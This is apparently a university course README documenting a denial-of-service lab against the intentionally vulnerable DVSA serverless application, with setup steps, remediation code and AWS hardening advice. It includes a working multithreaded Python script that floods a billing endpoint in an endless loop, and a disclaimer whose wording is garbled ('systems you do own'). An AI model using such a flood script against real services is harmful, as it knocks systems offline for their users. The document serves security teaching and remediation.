# Security Analysis: Denial of Service (DoS) in DVSA

## Project Overview
**Course:** ICS-344: Information Security  
**Institution:** King Fahd University of Petroleum and Minerals (KFUPM)  
**Target Application:** Damn Vulnerable Serverless Application (DVSA)  
**Vulnerability Focus:** Lesson 6 - Denial of Service (DoS) targeting the Billing API.

This repository documents the identification, exploitation, and remediation of a Denial of Service (DoS) vulnerability within a serverless architecture. The attack targets the `DVSA-PAYMENT-PROCESSOR` Lambda function, exploiting synchronous delays to exhaust account-wide concurrency limits.

---

## Repository Structure
To maintain a clean environment, the repository is organized as follows:

```text
├── assets/
│   ├── screenshots/       # Visual evidence of exploit and verification
│   └── videos/            # Walkthrough videos for exploitation and patching
├── scripts/
│   ├── DOS.py             # Multithreaded Python exploit script
│   └── setup_env.sh       # Helper script for environment variables
├── src/
│   ├── payment_original.py # Vulnerable Lambda code
│   └── payment_patched.py  # Remediated Lambda code
└── README.md              # Project documentation
```

---

## 1. Setup & Deployment
To replicate this environment, you must deploy the DVSA suite on AWS.

1.  **Clone the Official DVSA Repo:** `git clone https://github.com/m6000/dvsa`
2.  **Deploy via CloudFormation/SAM:** Use the provided templates in the DVSA repository to spin up the API Gateway, Lambda functions, and DynamoDB tables.
3.  **Access the Frontend:** Once deployed, note the S3 Bucket URL or CloudFront distribution where the frontend is hosted.
4.  **Identify Endpoints:** Ensure you have the URL for the `/order` endpoint (e.g., `https://[API-ID].execute-api.us-east-1.amazonaws.com/dvsa/order`).

---

## 2. Vulnerability Replication (Exploitation)
### The Root Cause
The vulnerability exists because the backend Lambda function includes an artificial `time.sleep()` call. In a serverless environment, this forces the execution environment to stay active and "busy" for the duration of the sleep, preventing it from processing other requests and quickly hitting the AWS Lambda concurrency limit.

### Step-by-Step Trigger
1.  **Generate a Valid Order:**
    Navigate to the DVSA store and add an item to your cart. Open your browser's **Network Tab** (F12) and capture the `order-id` and your `Authorization` Bearer token.
    
2.  **Verify via CLI (Optional):**
    Use `curl` to ensure the endpoint is reachable:
    ```bash
    curl -X POST https://<API_ENDPOINT>/dvsa/order \
    -H "Authorization: <YOUR_TOKEN>" \
    -d '{"action":"new", "cart-id":"...", "items":"..."}'
    ```

3.  **Prepare the Exploit Script (`DOS.py`):**
    Create a script that utilizes Python's `threading` library to flood the API Gateway.

```python
import threading
import requests

# Target Configuration
URL = "https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order"
TOKEN = "Bearer <INSERT_JWT_TOKEN_HERE>"
ORDER_ID = "<INSERT_ORDER_ID_HERE>"

def dos():
    payload = {
        "action": "billing",
        "order-id": ORDER_ID,
        "data": {"ccn": "4242424242424242", "exp": "11/2039", "cvv": "444"}
    }
    headers = {"Authorization": TOKEN}
    try:
        r = requests.post(URL, json=payload, headers=headers, timeout=10)
        print(f"Status: {r.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Launching concurrent threads to exhaust Lambda capacity
while True:
    threading.Thread(target=dos).start()
```

4.  **Execute the Attack:**
    Run the script: `python3 DOS.py`.
5.  **Observe Results:**
    * **Terminal:** You will see "Internal Server Error" (500) messages once the concurrency limit is reached.
    * **Frontend:** Attempt to checkout a different item. The page will hang indefinitely with a loading spinner.

---

## 3. Remediation & Patching
### The Fix Strategy
To secure the application, we implement two primary changes:
* **Remove Blocking Operations:** Delete the `time.sleep()` call to allow the Lambda to "Fail Fast" or succeed instantly.
* **Input Validation:** Implement a `MAX_BODY_BYTES` check to prevent resource exhaustion from oversized payloads.

### Step-by-Step Remediation
1.  **Open AWS Console:** Navigate to **Lambda** > **Functions** > `DVSA-PAYMENT-PROCESSOR`.
2.  **Edit Code:** Locate `payment_processing.py` in the embedded editor.
3.  **Apply Code Changes:**

**Remove the following lines:**
```python
# VULNERABLE BLOCK
n = random.randint(2, 4)
time.sleep(n)
```

**Add the validation block at the start of the handler:**
```python
MAX_BODY_BYTES = 4096  # Set a reasonable limit

def handle_payment(event, context):
    body = event.get('body', '')
    
    # Payload size validation
    if len(body.encode("utf-8")) > MAX_BODY_BYTES:
        return {
            'statusCode': 400,
            'body': 'Request body too large'
        }
    
    # ... rest of the logic ...
```

4.  **Deploy:** Click the **Deploy** button in the AWS console.

---

## 4. Verification After Fix
1.  **Re-run the Exploit:** Execute `python3 DOS.py` again.
2.  **Monitor Performance:** Even while the script is running, the Lambda functions now finish execution in milliseconds rather than seconds.
3.  **Frontend Test:** Open the DVSA store in a browser. Add an item (e.g., "Ring King") to the cart and click **Checkout**. 
4.  **Success:** The order should process successfully and instantly, proving that the concurrency pool is no longer being exhausted by the attack.

---

## Security Best Practices
* **Asynchronous Processing:** For long-running tasks (like actual payment gateway communication), use SQS queues rather than keeping a Lambda function "awake."
* **API Throttling:** Enable **Throttling** and **Usage Plans** in Amazon API Gateway to limit the number of requests a single user/token can make per second.
* **WAF Integration:** Deploy **AWS WAF** (Web Application Firewall) to detect and block volumetric DoS patterns before they reach your compute layer.

---
> **Disclaimer:** This documentation is for educational purposes only as part of the KFUPM ICS-344 curriculum. Never perform security testing on systems you do own or have explicit permission to test.
